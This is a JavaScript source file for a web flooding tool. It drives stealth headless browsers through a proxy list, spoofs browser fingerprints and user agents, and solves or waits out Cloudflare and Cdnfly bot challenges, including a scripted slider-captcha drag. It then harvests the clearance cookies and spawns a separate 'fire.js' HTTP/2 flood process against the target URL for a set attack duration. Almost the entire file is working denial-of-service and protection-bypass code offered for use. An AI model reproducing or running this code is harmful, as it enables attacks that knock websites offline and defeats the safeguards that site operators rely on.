const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
function spawnHttp2Process(url, userAgent, time, cookie, thread, proxy) {
   const args = [url, userAgent, time, cookie, rates, proxy];
   const http2Process = spawn("node", [
                   "fire.js",
                   url,
                   "50",
                   "15",
                   proxy,
                   rates,
                   cookie,
                   userAgent
               ]);
   http2Process.stdout.on('data', (data) => {
   });
   http2Process.stderr.on('data', (data) => {
   });
}

const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();

puppeteer.use(stealthPlugin);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const attackDuration = process.argv[7];
const isFlood = process.argv[8];
let floodMode;
if (isFlood === 'true') {
 floodMode = "(flooder enable)";
} else if (isFlood === 'false') {
 floodMode = "(flooder disable)";
} else {
 process.exit(1);
}
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const colors = {
 COLOR_RED: "\x1b[31m",
 COLOR_GREEN: "\x1b[32m",
 COLOR_YELLOW: "\x1b[33m",
 COLOR_RESET: "\x1b[0m",
 COLOR_PURPLE: "\x1b[35m",
 COLOR_CYAN: "\x1b[36m",
 COLOR_BLUE: "\x1b[34m",
};
const { spawn } = require("child_process");
function colored(colorCode, text) {
 console.log(colorCode + text + colors.COLOR_RESET);
};
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const nodeii = getRandomInt(120, 126);
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
function getCurrentTime() {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
}
const options = [

  { flag: '--load', value: get_option('--load') },
  { flag: '--fin', value: get_option('--fin') },
  { flag: '--static', value: get_option('--static') }

];
function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}
function check_proxy(proxy) {
 return new Promise((resolve, reject) => {
   request({
     url: "https://google.com",
     proxy: "http://" + proxy,
     headers: {
       'User-Agent': "curl/7.58.0",
     }
   }, (err, res, body) => {
     if (!err && res.statusCode === 200) {
       resolve(proxy);
     } else {
       reject();
     }
   });
 });
}
async function isProxyValid(browserProxy) {
 try {
   await check_proxy(browserProxy);
   return browserProxy;
 } catch (error) {
   throw new Error();
 }
}
async function detectChallenge(browserProxy, page) {
await page.waitForSelector('title');;
 const title = await page.title();
 const content = await page.content();
 if (title === "Attention Required! | Cloudflare") {
   throw new Error("Proxy blocked");
 }
if (title === "Just a moment...") {
await sleep(10)
 if (content.includes("challenge-platform")) {
   colored(colors.COLOR_CYAN, "FOUND CF challenge " + browserProxy);
   try {
     await sleep(20);
     const captchaContainer = await page.$(".spacer > div:first-child");
     if (captchaContainer) {
       const { x, y } = await captchaContainer.boundingBox();
       await page.mouse.click(x + 20, y + 20);
     } else if (enabled('static')) {
      await page.waitForFunction('window.__CF$cv$params');
      await page.waitForFunction(() => document.querySelector('script[src*="main.js"]') !== null);
      await page.setRequestInterception(true);
     }
   } finally {
     await sleep(15);
     return;
   }
 }
}
 if (content.includes("/_guard/html.js?js=click_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Click challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await page.waitForSelector('.main #access', { visible: true, timeout: 30000 });
       await page.click('.main #access');
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     await sleep(10);
     return;
   }
 }

 if (content.includes("/_guard/html.js?js=delay_jump_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly JS challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await sleep(20);
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     return;
   }
 }

 if (content.includes("/_guard/html.js?js=slider_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Slide challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await page.waitForSelector('#slider', { visible: true, timeout: 30000 });
       const sliderElement = await page.$('#slider');
       const sliderBoundingBox = await sliderElement.boundingBox();
       await sliderElement.click();
       const randomOffset = Math.random() * 10 + 10;
       await page.mouse.move(sliderBoundingBox.x + randomOffset, sliderBoundingBox.y);
       await page.mouse.down();
       for (let i = 0; i < 20; i++) {
           await page.mouse.move(sliderBoundingBox.x + (i * sliderBoundingBox.width / 20), sliderBoundingBox.y);
   await sleep(Math.random() * 0.1 + 0.05);
       }
       await page.mouse.up();
       await sleep(Math.random() * 5 + 3);
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     return;
   }
 }

 colored(colors.COLOR_PURPLE, "[+] No challenge detected " + browserProxy);
 await sleep(10);
 return;
}
async function openBrowser(targetURL, browserProxy) {
 const userAgents = [
   `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${nodeii}.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53`,
   `Mozilla/5.0 (Linux; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; DUA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537`,
   `Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Mi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; moto g(10) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; moto g(10) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Nokia 5.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36`,
 ];
 const randomIndex = Math.floor(Math.random() * userAgents.length);
 const randomUA = userAgents[randomIndex];
 const promise = async (resolve, reject) => {
   const browser = await puppeteer.launch({
     headless: false,
     ignoreHTTPSErrors: true,
     args: [
       "--proxy-server=http://" + browserProxy,
       '--start-maximized',
       '--no-sandbox',
       '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
       '--use-fake-device-for-media-stream',
       '--use-fake-ui-for-media-stream',
       '--enable-experimental-web-platform-features',
       '--disable-dev-shm-usage',
       '--disable-software-rasterizer',
       '--ignore-certificate-errors',
       '--disable-popup-blocking',
       '--disable-extensions',
       '--test-type',
       '--color-scheme=' + randomElement(['dark', 'light']),
       '--disable-browser-side-navigation',
       "--user-agent="
       + randomUA
      ],
    ignoreDefaultArgs: ['--enable-automation']
});
   try {
     colored(colors.COLOR_YELLOW, "[PUPPETEER] Started browser " + browserProxy);
     const [page] = await browser.pages();
     const client = page._client();
     
     
      await page.setExtraHTTPHeaders({
        'referer': targetURL 
    });
    await page.evaluateOnNewDocument(() => {
    navigator.permissions.query = (parameters) => {
        return Promise.resolve({ state: 'granted' });
    };
});

await page.setJavaScriptEnabled(true);
await page.setViewport({ width: 1920, height: 1080 });

    page.on("framenavigated", async (frame) => {
      if (frame.url().includes("challenges.cloudflare.com")) {
        await client.send("Target.detachFromTarget", { targetId: frame._id });
      }
    });
     page.setDefaultNavigationTimeout(70 * 1000);
   
     const userAgent = await page.evaluate(function () {
       return navigator.userAgent;
     });
     if (enabled('load')) {
        const blockedResources = ['BlockCssAssets', 'BlockImages', 'BlockFonts', 'BlockIcons', 'BlockMedia'];
        await page.setRequestInterception(true);
        page.on('request', (req) => {
          if (blockedResources.includes(req.resourceType())) {
            req.abort();
          } else {
            req.continue();
          }
        });
      }
      
if (enabled('fin')) {
    await page.evaluateOnNewDocument(() => {
        const setNavigatorProperty = (prop, value) => {
            Object.defineProperty(navigator, prop, { get: () => value });
        };

        [
            { prop: 'platform', value: 'Win64' },
            { prop: 'languages', value: ['en-US', 'en'] },
            { prop: 'keyboard', value: true },
            { prop: 'mediaCapabilities', value: true },
            { prop: 'mediaDevices', value: true },
            { prop: 'mediaSession', value: true },
            { prop: 'oscpu', value: 'Windows (Win32)' },
            { prop: 'product', value: 'Gecko' },
            { prop: 'productSub', value: '20100101' },
            { prop: 'vendor', value: 'Google Inc.' }
        ].forEach(({ prop, value }) => setNavigatorProperty(prop, value));

        Object.defineProperty(screen, 'width', { get: () => 1920 });
        Object.defineProperty(screen, 'height', { get: () => 1080 });
    });
}



     await page.goto(targetURL, { waitUntil: ["domcontentloaded", "networkidle2"] });
     await sleep(5);
     await detectChallenge(browserProxy, page, reject);
     const title = await page.title();
    
     
    
     const cookies = await page.cookies(targetURL);
     const referer = await page.evaluate(() => {
      return document.referrer;
    });
     resolve({
      title: title,
      browserProxy: browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: randomUA,
      content: await page.content(),
      referer: referer
    });

  } catch (exception) {
    
  } finally {
    await browser.close();
  }
}
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  try {
    const response = await openBrowser(targetURL, browserProxy);
   const referer = response.referer;
    const hasChallenge = response.content.includes("challenge-platform");
    const hasCfChlCookie = response.cookies.includes("cf_chl");
    const isValidCookie = response.cookies.length > 32;

    if (!hasChallenge && (!hasCfChlCookie || (hasCfChlCookie && isValidCookie))) {
      const currentTime = getCurrentTime();
      const cookies = `\nTIME : ${colors.COLOR_BLUE}(${currentTime})${colors.COLOR_RESET} 
=> PAGE TITLE : ${colors.COLOR_CYAN}${response.title}${colors.COLOR_RESET}
=> ${colors.COLOR_PURPLE}(${response.browserProxy})${colors.COLOR_RESET} 
=> User Agent: ${colors.COLOR_YELLOW}${response.userAgent}${colors.COLOR_RESET} 
=> Cookie: ${colors.COLOR_GREEN}${response.cookies}${colors.COLOR_RESET}
=> Referer: ${colors.COLOR_GREEN}${referer}${colors.COLOR_RESET}`;
      colored(colors.COLOR_RESET, cookies);

      if (isFlood === 'true') {
        await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, rates, response.browserProxy);
      }

      done(null, { task, currentTask: queue.length() });

    } else {
      if (retries < COOKIES_MAX_RETRIES) {
        await sleep(5);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
      } else {
        done(new Error());
      }
    }
  } catch (exception) {
    if (retries < COOKIES_MAX_RETRIES) {
      await sleep(7); 
      await startThread(targetURL, browserProxy, task, done, retries + 1);
    } else {
      done(new Error());
    }
  }
}

var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function __main__() {
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.splice(proxies.indexOf(browserProxy), 1);
    isProxyValid(browserProxy)
    .then(browserProxy => {
      queue.unshift({ browserProxy: browserProxy });
     
    })
    .catch(error => {
    });
  }
}

__main__();

setTimeout(function(){
   process.exit();
}, process.argv[7] * 1000);
